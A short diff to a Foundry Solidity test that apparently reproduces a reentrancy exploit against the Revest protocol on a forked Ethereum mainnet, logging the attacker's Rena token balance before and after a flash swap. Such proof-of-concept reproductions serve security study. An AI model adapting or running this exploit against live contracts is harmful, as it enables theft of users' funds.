@@ -12,8 +12,14 @@ contract ContractTest is DSTest {
     IRevest revest = IRevest(0x2320A28f52334d62622cc2EaFa15DE55F9987eD9);
     uint256 fnftId;
     bool reentered = false;
-
-    function test() public{
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    uint256 mainnetFork;
+    
+    function setUp() public {
+        mainnetFork = cheats.createFork("https://rpc.ankr.com/eth", 14465356); //fork mainnet at 14465356
+        cheats.selectFork(mainnetFork);
+    }
+    function testExploit() public{
         emit log_named_uint("Before exploit, Rena balance of attacker:",rena.balanceOf(msg.sender));
         pair.swap(5*1e18,0,address(this),new bytes(1));
         emit log_named_uint("After exploit, Rena balance of attacker:",rena.balanceOf(msg.sender));
